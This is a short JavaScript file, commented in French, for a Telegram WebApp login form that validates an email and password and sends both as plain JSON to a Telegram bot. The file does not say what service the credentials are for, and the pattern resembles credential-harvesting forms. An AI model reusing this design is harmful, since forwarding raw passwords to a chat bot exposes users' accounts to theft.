// Initialisation de l'application Telegram WebApp
let tg;
try {
    tg = window.Telegram.WebApp;
} catch (e) {
    console.log('Running in development mode');
    // Mode développement pour tester sans Telegram
    tg = {
        sendData: function(data) {
            console.log('Data would be sent:', data);
            alert('Données envoyées avec succès!');
        },
        close: function() {
            console.log('App would close');
            alert('Application fermée');
        }
    };
}

// Fonction pour valider l'email
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Fonction pour valider le mot de passe
function validatePassword(password) {
    return password.length >= 8 && 
           /[A-Z]/.test(password) && 
           /[0-9]/.test(password);
}

// Gestionnaire de soumission du formulaire
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Validation des champs
    if (!validateEmail(email)) {
        alert('Veuillez entrer une adresse email valide.');
        return;
    }
    
    if (!validatePassword(password)) {
        alert('Le mot de passe doit contenir au moins 8 caractères, une majuscule et un chiffre.');
        return;
    }
    
    // Envoi des données au bot
    tg.sendData(JSON.stringify({
        email: email,
        password: password
    }));
});

// Gestionnaire du bouton de fermeture
document.getElementById('closeButton').addEventListener('click', function() {
    tg.close();
}); 